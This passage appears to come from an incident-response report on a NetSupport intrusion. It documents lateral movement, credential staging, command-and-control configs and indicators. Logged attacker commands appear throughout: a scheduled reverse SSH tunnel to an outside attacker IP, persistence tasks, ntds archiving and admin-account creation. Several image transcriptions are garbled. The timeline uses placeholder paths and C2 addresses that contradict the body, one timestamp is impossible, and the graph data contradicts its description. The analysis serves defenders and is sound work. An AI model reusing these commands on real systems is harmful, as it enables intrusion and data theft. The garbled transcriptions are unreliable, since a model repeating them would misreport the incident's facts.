|\n  | -------------- | ---------- | -------------- | -------------------------------------------------------- | ------------------------------------------------------------------------------------- |\n  | DAY 4          |            |                |                                                          |                                                                                       |\n  | T22:24:38.059Z | 1          | DC #1          | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n  | T22:32:58.661Z | 1          | DC #2          | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n  | T22:37:27.321Z | 1          | Backup Server  | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n  | T22:56:31.380Z | 1          | Server A       | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n  | T22:58:16.084Z | 1          | File Server    | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n  | DAY 5          |            |                |                                                          |                                                                                       |\n  | T00:19:07.110Z | 1          | File Server    | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n```\n\n```image\nAlt: WMI Activity\nDescription: The image is a table displaying various event logs related to WMI activity over two days. It includes columns such as timestamp, event code, agent hostname, process parent command line, and process command line. Each row captures specific instances where the 'wmiprvse.exe' process was invoked on different servers, along with the command lines used to create scheduled tasks. The table provides detailed insights into lateral movement within the environment, specifically showcasing the execution of scheduled tasks that run 'mswow86.exe' on remote systems.\nTranscription: |\n  | @timestamp     | event.code | agent.hostname | process.parent.command_line                              | process.command_line                                                                                                              |\n  | -------------- | ---------- | -------------- | -------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |\n  | DAY 4          |            |                |                                                          |                                                                                                                                   |\n  | T22:26:14.405Z | 1          | DC #1          | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C schtasks.exe /create /sc onlogon /tn \"Wow64 Subsystem\" /rl highest /tr 1> \\\\127.0.0.1\\ADMIN$\\_1674********7443 2>&1 |\n  | T22:26:33.407Z | 1          | DC #2          | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C start \"\" \"%programdata%%\\schcache\\mswow86.exe\" 1> \\\\127.0.0.1\\ADMIN$\\_1674********72743 2>&1                        |\n  | T22:31:44.076Z | 1          |                |                                                          |                                                                                                                                   |\n  | T22:38:28.336Z | 1          |                |                                                          |                                                                                                                                   |\n  | T22:52:10.290Z | 1          | Backup Server  | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C schtasks.exe /create /sc onlogon /tn \"Wow64 Subsystem\" /rl highest /tr 1> \\\\127.0.0.1\\ADMIN$\\_1674********7964 2>&1 |\n  | T22:52:34.113Z | 1          | Server A       | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C start \"\" \"%programdata%%\\schcache\\mswow86.exe\" 1> \\\\127.0.0.1\\ADMIN$\\_1674********51836 2>&1                        |\n  | T22:57:84.888Z | 1          |                |                                                          |                                                                                                                                   |\n  | T22:59:11.685Z | 1          |                |                                                          |                                                                                                                                   |\n  | DAY 5          |            |                |                                                          |                                                                                                                                   |\n  | T00:20:51.885Z | 1          | File Server    | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C schtasks.exe /create /sc onlogon /tn \"Wow64 Subsystem\" /rl highest /tr 1> \\\\127.0.0.1\\ADMIN$\\_1674********8875 2>&1 |\n  | T00:22:17.862Z | 1          |                |                                                          | cmd.exe /Q /C start \"\" \"%programdata%%\\schcache\\mswow86.exe\" 1> \\\\127.0.0.1\\ADMIN$\\_1674********8844 2>&1                         |\n```\n\nFor a breakdown of the process command line arguments, refer to this previous report.\n\n### RDP\n\nRemote Desktop Protocol (RDP) was used from the beachhead to two servers and two domain controllers on the network. We can verify this activity with Windows Event ID 4624 with logon type 10. This log triggers whenever a user successfully logs on to a computer or server via remote interactive logon (RDP or other remote desktop services).\n\nBelow illustrates the threat actor initiating RDP sessions from the beachhead to various servers within the network on day eight of this intrusion.\n\n```image\nAlt: RDP Sessions\nDescription: The image presents a table detailing Windows event logs related to Remote Desktop Protocol (RDP) sessions initiated by a threat actor. It includes columns for timestamp, event code, agent name, source IP, logon type, and username. The table indicates multiple successful logon events (event code 4624) with a specific focus on the type of logon (RemoteInteractive) and highlights a local user account created by the threat actor, labeled as 'WDAGUtilityAccount2'. This data is crucial for understanding lateral movement within the network during the intrusion.\nTranscription: |\n  | @timestamp     | event.code | agent.name           | source.ip | winlog.event_data.LogonType | winlog.logon.type | user.name             |\n  |----------------|------------|----------------------|-----------|-----------------------------|-------------------|-----------------------|\n  | T01:45:43.852Z | 4624       | Backup Server        | .137      | 10                          | RemoteInteractive | WDAGUtilityAccount2   |\n  | T02:29:20.539Z | 4624       | Server A             | .137      | 10                          | RemoteInteractive | Local Service Account |\n  | T07:45:46.135Z | 4624       | Domain Controller #1 | .137      | 10                          | RemoteInteractive | Compromised User #2   |\n  | T09:29:33.393Z | 4624       | Domain Controller #1 | .137      | 10                          | RemoteInteractive | Compromised User #2   |\n  | T09:30:31.359Z | 4624       | Domain Controller #2 | .137      | 10                          | RemoteInteractive | Compromised User #2   |\n  | T10:09:46.243Z | 4624       | Domain Controller #2 | .137      | 10                          | RemoteInteractive | Compromised User #2   |\n```\n\nBelow, illustrates the full network architecture and lateral movement seen within this incident.\n\n```image\nAlt: Network Architecture\nDescription: The image depicts a network architecture diagram illustrating the lateral movement of a threat actor within a victim network. It shows the connection from the threat actor's VPS (Virtual Private Server) through a reverse SSH tunnel to the beachhead on the victim network, highlighting the TCP ports used (22 and 2222). Various servers, including domain controllers (DC A, DC B), a backup server, and a VPN server, are represented, indicating the pathways of RDP (Remote Desktop Protocol) and Impacket connections, which are illustrated with dashed and solid lines respectively. The diagram visually conveys the flow of data and the relationships between different components in the network during an intrusion.\nTranscription: |\n  Internet\n  VPS\n  Threat Actor\n  185.206.146.129\n  \n  Reverse SSH Tunnel\n  TCP 22 → TCP 2222\n  \n  Victim Network\n  Beachhead\n  \n  - Fileshare\n  - Backup Server\n  - DC A\n  - DC B\n  - Server A\n  - VPN Server\n  \n  Key:\n  - Solid lines indicate \"Impacket\"\n  - Dashed lines indicate \"RDP\"\n```\n\nDuring the intrusion, the threat actor revealed two different host names leaked in various Windows Event logs during their RDP sessions.\n\n```\nDESKTOP-TBDQ6K1\nWIN-5ODCFIGQRP3\n```\n\nExample Windows event ID 4776:\n\n```image\nAlt: Event ID 4776\nDescription: The image displays a log entry related to a Windows authentication attempt. It includes details such as the authentication package used, the logon account name (WDAGUtilityAccount2), the source workstation (DESKTOP-TBDQ6K1), and an error code (0x0), indicating the attempt to validate credentials for an account.\nTranscription: |\n  The computer attempted to validate the credentials for an account.\n  Authentication Package: MICROSOFT_AUTHENTICATION_PACKAGE_V1_0\n  Logon Account: WDAGUtilityAccount2\n  Source Workstation: DESKTOP-TBDQ6K1\n  Error Code: 0x0\n```\n\nExample Windows event ID 4624:\n\n```image\nAlt: Event ID 4624\nDescription: The image displays a Windows Event Log entry indicating a successful logon event. Key details include the Security ID, Logon Type (which is set to 3, indicating a network logon), and the Workstation Name (DESKTOP-TBDQ6K1). It also shows information about the New Logon, including the Account Name (WDAGUtilityAccount2) and the Logon GUID. Additional fields pertain to the authentication process, specifying the Logon Process as NtLmSsp and the Authentication Package as NTLM.\nTranscription: |\n  An account was successfully logged on.\n  \n  Subject:\n    Security ID: S-1-0-0\n    Account Name: -\n    Account Domain: -\n    Logon ID: 0x0\n  \n  Logon Information:\n    Logon Type: 3\n    Restricted Admin Mode: -\n    Virtual Account: No\n    Elevated Token: Yes\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n    Security ID: S-1-5-21-4111996580-4053983655-1651626109-1002\n    Account Name: WDAGUtilityAccount2\n    Account Domain: -\n    Logon ID: 0x57FB0B8\n    Linked Logon ID: 0x0\n    Network Account Name: -\n    Network Account Domain: -\n    Logon GUID: {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n    Process ID: 0x0\n    Process Name: -\n  \n  Network Information:\n    Workstation Name: DESKTOP-TBDQ6K1\n    Source Network Address: 10.***.137\n    Source Port: 0\n  \n  Detailed Authentication Information:\n    Logon Process: NtLmSsp\n    Authentication Package: NTLM\n    Transited Services: -\n    Package Name (NTLM only): NTLM V2\n    Key Length: 128\n```\n\nExample Windows event ID 4779:\n\n```image\nAlt: Event ID 4779\nDescription: The image depicts a log entry detailing an RDP (Remote Desktop Protocol) session disconnection from a Windows Station. Key information includes the account name 'WDAGUtilityAccount2', account domain, and logon ID. The session name is specified as 'RDP-Tcp#1'. Additional information reveals the client name as 'DESKTOP-TBDQ6K1' along with a masked client address. This log entry is relevant to monitoring user activity and understanding session management during a security incident.\nTranscription: |\n  A session was disconnected from a Window Station.\n  Subject:\n      Account Name: WDAGUtilityAccount2\n      Account Domain:\n      Logon ID: 0x581A582\n  Session:\n      Session Name: RDP-Tcp#1\n  Additional Information:\n      Client Name: DESKTOP-TBDQ6K1\n      Client Address: 10.***.137\n  This event is generated when a user disconnects from an existing Terminal Services session, or when a user switches away from an existing desktop using Fast User Switching.\n```\n\n## Collection\n\nThe threat actor was observed connecting to a file server from the Domain Controller and browsing multiple secretive documents on the system.\n\n```image\nAlt: File Server\nDescription: The image displays a table containing command lines related to processes executed on a Windows system. It shows the parent process 'C:\\Windows\\Explorer.EXE' and several instances of the 'C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE' command lines that include paths to potentially sensitive documents, indicated by the presence of '.docx' file extensions. The specific details of the document names are redacted.\nTranscription: |\n  | process.parent.command_line | process.command_line                                                      |\n  | --------------------------- | ------------------------------------------------------------------------- |\n  | C:\\Windows\\Explorer.EXE     | \"C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE\" \"\\\\[REDACTED].doc\"  |\n  | C:\\Windows\\Explorer.EXE     | \"C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE\" \"\\\\[REDACTED].docx\" |\n  | C:\\Windows\\Explorer.EXE     | \"C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE\" \"\\\\[REDACTED].docx\" |\n  | C:\\Windows\\Explorer.EXE     | \"C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE\" \"\\\\[REDACTED].doc\"  |\n```\n\nAdditionally, we see the threat actor using 7-zip to collect the previously dumped ntds and a text file called mf.txt.\n\n```image\nAlt: 7-Zip Collection\nDescription: The image is a table displaying event logs related to the execution of the '7z.exe' process. It contains details such as event codes, process names, command lines used, and the parent process names along with their command lines. The table provides specific data on the actions taken by the threat actor, including commands to archive files and collect sensitive information.\nTranscription: |\n  | event.code | process.name | process.command_line                                         | process.parent.name | process.parent.command_line |\n  | ---------- | ------------ | ------------------------------------------------------------ | ------------------- | --------------------------- |\n  | 1          | 7z.exe       | 7z.exe a c:\\Users\\Public\\ntds.7z \"Active Directory\" registry | cmd.exe             | C:\\Windows\\system32\\cmd.exe |\n  | 1          | 7z.exe       | 7z.exe a mf.7z mf.txt                                        | cmd.exe             | C:\\Windows\\system32\\cmd.exe |\n```\n\n## Command and Control\n\n### NetSupport\n\nAs referenced in the Initial Access section, the NetSupport deployment script writes a `client32.ini` file to the AppData Roaming path, which specifies the primary and secondary gateway.\n\n```image\nAlt: NetSupport Gateway\nDescription: The image shows a screenshot of a Notepad window displaying the contents of a configuration file named 'client32.ini'. The file contains settings related to the NetSupport command and control (C2) communication, specifying the primary and secondary gateway addresses, port number, and other parameters. The details indicate the structure and values used for establishing communication in the context of a cybersecurity incident.\nTranscription: |\n  [HTTP]\n  CMPI=60\n  GatewayAddress=Npinmclaugh11.com:2145\n  GSK=GD;Q0IEO:E>IBLGE<DADFI<B\n  Port=2145\n  SecondaryGateway=Npinmclaugh14.com:2145\n  SecondaryPort=2145\n```\n\nThe primary gateway, `npinmclaugh11[.]com:2145`, was unsuccessful as it resolved to an IP of `127.0.0.127`. As a result, all communication was thus routed through the secondary gateway at `npinmclaugh14[.]com:2145`.\n\n```\nDns query:\nRuleName: -\nUtcTime: <DAY 1> 03:34:16.236\nProcessGuid: {a9d5a793-0bb7-63ca-9404-000000000300}\nProcessId: 7648\nQueryName: Npinmclaugh11.com\nQueryStatus: 0\nQueryResults: 127.0.0.127;\nImage: C:\\Users\\<REDACTED>\\AppData\\Roaming\\eHNjqgzZ\\presentationhost.exe\nUser: <REDACTED>\n```\n\n```\nDns query:\nRuleName: -\nUtcTime: <DAY 1> 03:34:18.828\nProcessGuid: {a9d5a793-0bb7-63ca-9404-000000000300}\nProcessId: 7648\nQueryName: Npinmclaugh14.com\nQueryStatus: 0\nQueryResults: 89.185.85.44;\nImage: C:\\Users\\<REDACTED>\\AppData\\Roaming\\eHNjqgzZ\\presentationhost.exe\nUser: <REDACTED>\n```\n\nNetSupport connections were established on day one to 89.185.85.44 on port 2145; however, on day five of the intrusion, another NetSupport `client32.ini` file was deployed to other assets on the network, introducing a new command and control server of `wsus-isv-local[.]tech:133` and `wsus-isv-internal[.]tech:133`.\n\n```image\nAlt: NetSupport C2\nDescription: The image displays a Notepad window containing the contents of a configuration file named 'client32.ini'. The file outlines the settings for a command and control (C2) server, with details such as 'GatewayAddress', 'SecondaryGateway', and their respective ports. The format used is structured, with sections clearly labeled, indicating the presence of configuration parameters for NetSupport.\nTranscription: |\n  [General]\n  [HTTP]\n  GatewayAddress=wsus-isv-local.tech:133\n  GSK=FK;Q@GCPGA:F=JBEGK<H@LEK:C?BDF\n  Port=133\n  SecondaryGateway=wsus-isv-internal.tech:133\n  SecondaryPort=133\n```\n\n```\nDns query:\nRuleName: -\nUtcTime: <DAY 4> 22:26:27.990\nProcessGuid: {1dc91c81-5b19-63d0-0806-000000000600}\nProcessId: 4852\nQueryName: wsus-isv-local.tech\nQueryStatus: 0\nQueryResults: 79.137.206.37;\nImage: C:\\ProgramData\\schcache\\mswow86.exe\nUser: <REDACTED>\\Administrator\n```\n\nThe following table provides a summary of all the domains and IPs used by NetSupport during this incident :\n\n| **NetSupport C2 Domain** | **DNS Resolve Status** | **Resolved IP** |\n| -------------------------| -----------------------| ----------------|\n| npinmclaugh11[.]com      | NOERROR                | 127.0.0.127     |\n| npinmclaugh14[.]com      | NOERROR                | 89.185.85.44    |\n| wsus-isv-local[.]tech    | NOERROR                | 79.137.206.37   |\n| wsus-isv-internal[.]tech | NXDOMAIN               | N/A             |\n\n```image\nAlt: NetSupport C2\nDescription: The image is a line graph titled \"NetSupport C2 Communication,\" illustrating the count of records associated with two IP addresses over a span of eight days. The x-axis represents the days (from Day 1 to Day 8), while the y-axis indicates the count of records. Two lines are plotted: one in blue representing the IP address 79.137.206.37, and the other in orange representing the IP address 89.185.85.44. The graph shows a significant spike in communication for the blue line starting on Day 7, indicating increased activity for the IP address 79.137.206.37, while the orange line exhibits relatively lower counts throughout the observed period.\nTranscription: |\n  Graph Title: NetSupport C2 Communication\n  \n  Y-Axis: Count of Records\n  X-Axis: Date\n  \n  Data Points:\n  - Day 1: 500 (79.137.206.37), 0 (89.185.85.44)\n  - Day 2: 0 (79.137.206.37), 0 (89.185.85.44)\n  - Day 3: 0 (79.137.206.37), 0 (89.185.85.44)\n  - Day 4: 0 (79.137.206.37), 0 (89.185.85.44)\n  - Day 5: 0 (79.137.206.37), 0 (89.185.85.44)\n  - Day 6: 0 (79.137.206.37), 0 (89.185.85.44)\n  - Day 7: 3000 (79.137.206.37), 0 (89.185.85.44)\n  - Day 8: 3000 (79.137.206.37), 0 (89.185.85.44)\n  \n  Line Colors:\n  - Blue: 79.137.206.37\n  - Orange: 89.185.85.44\n```\n\n### SSH Tunnelling\n\nOn day five of this intrusion, two scheduled tasks (“SSH Server” and “SSH Key Exchange”) were created on the beachhead to establish a local SSH server running on port 2222 for remote system 185.206.146.129.\n\n```image\nAlt: SSH Tunnelling\nDescription: The image displays a table of processes logged during 'Day 4' of an intrusion event. It includes the columns for timestamp, process name, process ID, and command line executed. Notably, two entries highlight commands related to the creation of scheduled tasks for an SSH server and SSH key exchange, which indicate the establishment of an SSH reverse tunnel. The commands emphasize the malicious intent of setting up remote access through SSH on a specified port.\nTranscription: |\n  | @timestamp | process.name  | process.pid    | process.command_line                                                                                                                                                                                                                                                  |\n  | ---------- | ------------- | -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | Day 4      | 08:30:37.850Z | ssh-keygen.exe | ssh-keygen -f C:\\ProgramData\\sshd\\config\\id_rsa -t rsa -N \"\"                                                                                                                                                                                                          |\n  |            | 08:30:42.129Z | icacls.exe     | C:\\ProgramData\\sshd\\config\\keys\\id_rsa /inheritance:r                                                                                                                                                                                                                 |\n  |            | 08:30:42.158Z | icacls.exe     | C:\\ProgramData\\sshd\\config\\keys\\id_rsa /grant:r \"<redacted>\" :\"(R)\"                                                                                                                                                                                                   |\n  |            | 08:30:42.178Z | icacls.exe     | C:\\ProgramData\\sshd\\config\\keys\\id_rsa /inheritance:r                                                                                                                                                                                                                 |\n  |            | 08:30:42.202Z | icacls.exe     | C:\\ProgramData\\sshd\\config\\keys\\id_rsa /grant:r \"<redacted>\" :\"(R)\"                                                                                                                                                                                                   |\n  |            | 08:30:42.224Z | schtasks.exe   | /create /sc minute /mo 1 /tn \"SSH Server\" /rl highest /tr \"C:\\ProgramData\\sshd\\sshd.exe -f C:\\ProgramData\\sshd\\config\\sshd_config\"                                                                                                                                    |\n  |            | 08:30:42.335Z | schtasks.exe   | /create /sc minute /mo 1 /tn \"SSH Key Exchange\" /rl highest /tr \"C:\\ProgramData\\sshd\\ssh.exe -i C:\\ProgramData\\sshd\\config\\keys\\id_rsa -N -R 369:127.0.0.1:2222 root@185.206.146.129 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15\" |\n```\n\n```image\nAlt: SSH Tunnelling\nDescription: The image is a tabular data representation showing SSH connection logs, detailing events captured by a monitoring system. The columns include 'event.dataset,' 'source.ip,' 'destination.ip,' 'destination.port,' 'zeek.ssh.server,' 'zeek.ssh.host_key,' 'destination.geo.country_name,' and 'destination.as.organization.name.' Each row corresponds to a separate SSH event, indicating connections made from the 'Beachhead' to the destination IP '185.206.146.129' on port 22. The 'zeek.ssh.server' shows the version of the SSH service running, and 'destination.as.organization.name' indicates the organization associated with the destination IP.\nTranscription: |\n  | event.dataset | source.ip | destination.ip  | destination.port | zeek.ssh.server                        | zeek.ssh.host_key                               | destination.geo.country_name | destination.as.organization.name |\n  | ------------- | --------- | --------------- | ---------------- | -------------------------------------- | ----------------------------------------------- | ---------------------------- | -------------------------------- |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n```\n\nThe command used to establish the reverse SSH tunnel within the scheduled task is described below:\n\n```image\nAlt: SSH Command\nDescription: The image depicts a detailed breakdown of a Reverse SSH Command used in cybersecurity. It shows various options and arguments associated with the command, such as invoking SSH, specifying the identity file for authentication, preventing remote command execution, binding ports, and connection settings. Each part of the command is visually connected with explanations, making it clear how each component functions and its significance in establishing a reverse SSH tunnel.\nTranscription: |\n  Reverse SSH Command\n  -----------------------------------------\n  %programdata%\\sshd\\ssh.exe          ── Invoke SSH\n  -i %programdata%\\sshd\\config\\keys\\id_rsa ── Private key used to authenticate to the remote server\n  -N                                   ── Prevents remote commands from executing since the command will only forward traffic.\n  -R 369:127.0.0.1:2222               ── Bind to port 369 on the remote system, and listen locally on port 2222 for traffic originating from 369.\n  root@185.206.146.129                ── Connect to 185.206.146.129 using root, and bind to port 396.\n  -o StrictHostKeyChecking=no          ── Prevent a interactive message from indicating the remote servers host key is unknown.\n  -o ServerAliveInterval=60            ── Number of seconds before the client will send a NULL packet to the server to keep the connection active.\n  -o ServerAliveCountMax=15            ── Number of keep alive packets that can be sent by the client before a response is received.\n```\n\nBelow diagram depicts this SSH reverse tunnel from the victim network to attacker’s VPS.\n\n```image\nAlt: SSH Tunnel\nDescription: The image illustrates the configuration of an SSH reverse tunnel from a victim network to an attacker's Virtual Private Server (VPS). It shows the threat actor's IP address (185.206.146.129) and highlights the communication path via TCP port 22 for the VPS and TCP port 2222 for the victim's beachhead. The diagram effectively conveys the concept of SSH tunneling in the context of a cyber intrusion.\nTranscription: |\n  Internet\n  \n  VPS\n  Threat Actor\n  185.206.146.129\n  \n  Reverse SSH Tunnel\n  TCP 22 → TCP 2222\n  \n  Victim Network\n  Beachhead\n```\n\n## Exfiltration\n\nDuring the intrusion, we noticed that the threat actors staging data of interest.  It is likely that the threat actor exfiltrated the data over the encrypted C2 channel; however, we observed no evidence of this activity.  The _ntds.dit_ can be used to dump hashes from the Active Directory, which can then be cracked using a tool like Hashcat. The file _mf.txt_ contained all dumped events with event id 4624. This could be analyzed offline to determine possible interesting accounts without actively querying the Active Directory. No specific exfiltration actions were observed, so anything taken was likely moved over existing command and control channels. The threat actor also appeared to be interested in some documents, but we only observed opening of those files, not any exfiltration attempts.\n\n## Impact\n\nThe threat actors were evicted from the network before any further impact occurred.\n\n## Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a detailed timeline chart documenting a cybersecurity incident involving a Netsupport intrusion. It outlines specific events over multiple days, including timestamps of actions such as initial execution, persistence, command and control, discovery actions, lateral movement, and credential access on a domain controller. Each entry provides context about the activities performed, including commands executed and outcomes associated with the intrusion. The layout organizes the information chronologically, making it easy to follow the progression of the incident.\nTranscription: |\n  Netsupport Intrusion Results in Domain Compromise\n  \n  Day 1\n  03:34 UTC Initial Execution\n  - WScript.exe (C:\\Users\\Public\\Documents\\7329.js)\n  \n  03:34 UTC Persistence, Execution, and Command Control\n  - 23236: Downloads Netsupport Deployment Script\n  - Netsupport executed on hardcoded host\n  - Execution initiated via User Run key\n  - C2: 69.185.45.215\n  \n  03:49 UTC Discovery via Netsupport on Beachhead\n  - 185.204.145.251 2541 2554 2560 2603 2605\n  - Confidence:\n    - Version\n    - User\n    - Host group: \"Domain Admins\" /domain\n    - System info\n  \n  09:28 UTC Discovery\n  - net group \"Domain Admins\" /domain\n  \n  19:47 UTC Defense Evasion\n  - Initial settings changed to remote server\n  - Allow rules for WMI and DCOM\n  \n  Day 5\n  03:49 UTC Discovery\n  \n  Day 6\n  08:30 UTC Persistence and Command Control\n  - C:\\path\\to\\script.bat\n  - C:\\path\\to\\config.json: 15 min on port 2222\n  - Schedule task to execute on user logon\n  \n  10:55 UTC Discovery and Lateral Movement via atexec.py\n  - net group \"Enterprise Admins\" /domain\n  \n  20:15 UTC Lateral Movement\n  - Verifies by activity across various remote hosts\n  \n  Day 7\n  00:22 UTC Lateral Movement and Discovery\n  - Research of group membership 15 min prior\n  - 185.204.145.251 2541 2554 2560 2603 2605\n  - C2: 69.185.45.215\n  \n  22:25 UTC Credential Access on Domain Controller\n  - 185.204.145.251 2044 2394 2396 2405\n  - C:\\programdata\\microsoft\\windows\\start menu\\programs\\\n  \n  01:29 UTC Credential Access Domain Controller\n  - C:\\programdata\\microsoft\\windows\\start menu\\programs\\\n  \n  01:45 UTC Lateral Movement\n  - RDP login from beachhead host to domain controller\n  \n  02:56 UTC Defense Evasion on Domain Controller\n  - powershell: Add-PSSessionConfiguration -Name public\n  - powershell: Add-PSSessionConfiguration -Name custom\n  \n  Day 8\n  01:05 UTC Discovery from Domain Controller\n  - 185.204.145.251 2044 2394 2396 2405\n  - C:\\Users\\Public\\Documents\\script.bat\n  \n  01:43 UTC Persistence Established on Backup Server\n  - net user WEB\\BackupUser /active:yes /add\n  - net localgroup Administrators WEB\\BackupUser /add\n  \n  01:56 UTC Discovery from Backup Server\n  - C:\\Users\\Public\\Documents\\script.bat\n  \n  03:05 UTC Credential Access\n  - LSASecrets dumped on serverless host using Procdump\n  - Find /T /s\n  \n  16:52 UTC Persistence\n  - (script response to create local admin)\n  - C:\\Users\\Public\\Documents\\script.bat\n```\n\n## Indicators\n\n### Atomic\n\n```\n1otal[.]com\n79.137.202.132\n185.206.146.129\nnpinmclaugh11[.]com\nnpinmclaugh14[.]com\n89.185.85.44\nwsus-isv-local[.]tech\n79.137.206.37\nwsus-isv-internal[.]tech\n```\n\n### Computed\n\n```\n2326.js\n72dc8b8b6c7c083128728b8405fa5a8f\n9060c11e7d18d7047ad81aa4241187eebd93c0da\nb1f52abc28427c5a42a70db9a77163dde648348e715f59e8a335c7252ae4a032\n\nNSM.LIC\ne9609072de9c29dc1963be208948ba44\n03bbe27d0d1ba651ff43363587d3d6d2e170060f\ndc6a52ad6d637eb407cc060e98dfeedcca1167e7f62688fb1c18580dd1d05747\n\nNSM.ini\n88b1dab8f4fd1ae879685995c90bd902\n3d23fb4036dc17fa4bee27e3e2a56ff49beed59d\n60fe386112ad51f40a1ee9e1b15eca802ced174d7055341c491dee06780b3f92 \n\nPingCastle.exe\necb98b7b4d4427eb8221381154ff4cb2  PingCastle.exe\n72dbb719b05f89d9d2dbdf186714caf7639daa36\n768021fc242054decc280675750dec0a9e74e764b8646864c58756fa2386d2a2\n\nclient32.ini\n729711d44606095a4727aed7ff4d864d\n8af9952f5e0fa84606f588c5704c5a5ab7e06822\nbba34ad7183d7911f7f2c53bfe912d315d0e44d7aa0572963dc003d063130e85\n\nclient32u.ini\n7ba6ead2477bd9956886086f69552ac6\n3a8c2155f9b97e06f3d9990387492ef0260f6209\naa92645428fb4c4e2cccbdf9b6acd7e6a51eecc2d6d63d7b8fe2e119e93c2bb5\n\ninstall.bat\nb0f3b2741a50a3608f5c7f898d14c571\n3021194d590f5dfb32fb24c7d0e359c4db2f9178\n041b0504742449c7c23750490b73bc71e5c726ad7878d05a73439bd29c7d1d19\n\nmswow86.exe\nc60ac6a6e6e582ab0ecb1fdbd607705b\nba9de479beb82fd97bbdfbc04ef22e08224724ba\n4d24b359176389301c14a92607b5c26b8490c41e7e3a2abbc87510d1376f4a87\n\nnetscan32.exe\nd1212fb5c6333c218f62f3f83341539c\n19be503233f0eda426a418addc82edecf223af9d\n097f2a0e032bf20757e004e80c9a2640f41b8514e32d42004632de7c721b015f\n\nnetscan64.exe\nb30025427a546c23b122eea43171ef21\nf85c2447003221f59c9f0fa6654464ac78015be3\n5ef9844903e8d596ac03cc000b69bbbe45249eea02d9678b38c07f49e4c1ec46\n\nnskbfltr.inf\n26e28c01461f7e65c402bdf09923d435\n1d9b5cfcc30436112a7e31d5e4624f52e845c573\nd96856cd944a9f1587907cacef974c0248b7f4210f1689c1e6bcac5fed289368\n\nnsm_vpro.ini\n3be27483fdcdbf9ebae93234785235e3\n360b61fe19cdc1afb2b34d8c25d8b88a4c843a82\n4bfa4c00414660ba44bddde5216a7f28aeccaa9e2d42df4bbff66db57c60522b\n\nntds.bat\nab828b585b4c2ce90171e5e0b13aaa55\n5454d444aeefda5fb251b081218082ec858b94d3\n060e9ff09cd97ec6a1b614dcc1de50f4d669154f59d78df36e2c4972c2535714\n\nremcmdstub.exe\n6fca49b85aa38ee016e39e14b9f9d6d9\nb0d689c70e91d5600ccc2a4e533ff89bf4ca388b\nfedd609a16c717db9bea3072bed41e79b564c4bc97f959208bfa52fb3c9fa814\n\nstart.bat\n2736d3a1aa9cba6fa61db380d4bdf447\n2848dc0e665eb1b2508b75b4375c6937ab9a4968\n4c0736c9a19c2e172bb504556f7006fa547093b79a0a7e170e6412f98137e7cd\nB\n\npth_addadmin.exe\n4b0f48275787